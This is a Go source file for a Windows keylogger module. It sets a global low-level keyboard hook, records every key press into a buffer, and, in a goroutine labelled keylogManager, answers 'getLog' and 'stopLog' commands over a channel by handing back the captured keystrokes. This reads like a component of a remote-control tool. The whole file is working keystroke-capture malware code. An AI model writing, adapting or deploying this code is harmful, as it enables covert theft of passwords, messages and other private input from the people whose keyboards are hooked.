package KBHook

import (
	"fmt"
	"strings"
	"syscall"
	"unsafe"
)

// The WH_KEYBOARD_LL kind of hook need GetMessage loop to get message


// Defines const
const WH_KEYBOARD_LL = 13
const WM_KEYDOWN = 0x100
const MAPVK_VK_TO_CHAR = 2
const MAPVK_VK_TO_VSC = 0

// https://docs.microsoft.com/fr-fr/windows/win32/api/winuser/ns-winuser-kbdllhookstruct?redirectedfrom=MSDN
type KBDLLHOOKSTRUCT struct {
	VKCode      uint32
	ScanCode    uint32
	Flags       uint32
	Time        uint32
	DWExtraInfo uint32
}

// Define global vars
var lResult HHOOK
var keysBuffer = make([]string, 0, 1024)
var strChan chan string
var locker int = 0

// https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/ms644985(v=vs.85)?redirectedfrom=MSDN
// Pointer of Fct
var hookProc = func(code, wParam, lParam uint64) uintptr {
	k := *(*KBDLLHOOKSTRUCT)(unsafe.Pointer(uintptr(lParam)))
	if wParam == WM_KEYDOWN {
		c := MapVirtualKey(k.VKCode, MAPVK_VK_TO_VSC)

		if c != 0 {
			lParamValue := uint32(c) << 16
			buf := make([]uint16, 40)
			ptrBuf := &buf[0]
			_ = GetKeyNameText(lParamValue, ptrBuf, 40)
			str := syscall.UTF16ToString(buf)
			keysBuffer = append(keysBuffer, str)
			fmt.Println(keysBuffer)
		}
	}
	return uintptr(CallNextHookEx(0, code, wParam, lParam))
}

func setHook() {
	lResult = SetWindowsHookExW(
		WH_KEYBOARD_LL,
		HOOKPROC(syscall.NewCallback(hookProc)),
		0,
		0)
	if lResult == 0 {
		panic("Hooking failed")
	}
}

func unHook(hook HHOOK) {
	UnhookWindowsHookEx(hook)
	fmt.Println("UnHooked")
}

func StartKBHook(passStrChan chan string) {
	setHook()
	var msg *MSG
	keysBuffer =keysBuffer[:0]
	locker = 0
	strChan = passStrChan
	go keylogManager(strChan)

	fmt.Println("enter GetMessage Loop")
	for locker == 0{
		GetMessageW(&msg, 0, 0, 0)
	}
	fmt.Println("out hbk")
}

func keylogManager(strChan chan string) {
	for locker == 0 {
		select {
		case cmd := <-strChan:
			switch cmd {
			case "stopLog":
				fmt.Println("KBHook received stopLog")
				locker = 1
				unHook(lResult)
				break
			case "getLog":
				fmt.Println("KBHook received getLog")
				strChan <- strings.Join(keysBuffer, "")
			}
		default:
			if locker == 0 {
				continue
			} else {
				break
			}
		}
	}
	fmt.Println("out manager")
}